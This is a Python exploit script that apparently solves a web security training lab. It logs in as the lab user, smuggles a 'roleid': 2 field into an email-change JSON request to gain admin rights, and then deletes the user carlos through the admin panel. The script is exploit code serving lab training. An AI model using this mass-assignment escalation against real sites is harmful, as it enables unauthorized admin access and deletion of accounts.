import argparse
import re
from bs4 import BeautifulSoup
from colorama import Fore
import requests
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', "--url", required=True, help="Target URL (e.g., https://target.com)")
    parser.add_argument('--proxy', help='Proxy URL (e.g., http://127.0.0.1:8080)')
    args = parser.parse_args()

    url = args.url.rstrip('/')

    print(f"{Fore.BLUE}Starting...{Fore.RESET}")
    session = requests.Session()

    if args.proxy:
        session.proxies = {
            "http": args.proxy,
            "https": args.proxy
        }
    session.verify = False
    
    # We have to login as peter, update email, and ALONG with the email, pass the parameter: "roleid":2

    print(f"{Fore.YELLOW}STEP 1:{Fore.RESET} Login as 'wiener:peter'...")
    login(session, url, {"username":"wiener", "password": "peter"})
    
    # change the profile (include roleid in the POST data)
    set_roleid_2(session, url, {"email":"a@a", "roleid": 2})
    print(f"{Fore.GREEN}[+] roleid successfully set to 2{Fore.RESET}")

    admin = fetch(session, url, "/admin")
    if admin.status_code != 200:
        print(f"{Fore.RED}[-] Admin panel not accessible!{Fore.RESET}")
        exit(1)

    print(f"{Fore.GREEN}[+] Admin panel is accessible!{Fore.RESET}")

    print(f"{Fore.YELLOW}STEP 2:{Fore.RESET} Deleting carlos user...")

    delete = fetch(session, url, f"/admin/delete?username=carlos")
    if delete.status_code == 302:
        print(f"{Fore.GREEN}[+] Successfully deleted carlos user. Lab solved!{Fore.RESET}")
    else:
        print(f"{Fore.RED}[-] Failed to delete carlos user. Status: {delete.status_code}{Fore.RESET}")
        exit(1)

def fetch(session, url, path):
    full_url = f"{url}{path}"
    try:
        res = session.get(full_url, allow_redirects=False)
        print(f"{Fore.CYAN}[REQUEST]{Fore.RESET} GET {full_url} - Status: {res.status_code}")
        return res
    except Exception as e:
        print(f"{Fore.RED}[-] Failed to fetch {path} due to: {e}{Fore.RESET}")
        exit(1)


def login(session, url, data):
    try:
        res = session.post(f"{url}/login", data=data, allow_redirects=False)
        print(f"{Fore.CYAN}[REQUEST]{Fore.RESET} POST {url}/login - Status: {res.status_code}")
    except Exception as e:
        print(f"{Fore.RED}[-] Failed to login as '{data['username']}' due to: {e}{Fore.RESET}")
        exit(1)

def set_roleid_2(session, url, data): ## criamos uma variavel que consegue postar de maneira editavel nessa URL
    try:
        res = session.post(f"{url}/my-account/change-email", json=data, allow_redirects=False) ## SETTA JSON CONTENT
        print(f"{Fore.CYAN}[REQUEST]{Fore.RESET} POST {url}/my-account/change-email - Status: {res.status_code}")
        return res
    except Exception as e:
        print(f"{Fore.RED}[-] Failed to set roleid to 2: {e}{Fore.RESET}")
        exit(1)

if __name__ == "__main__":
    main()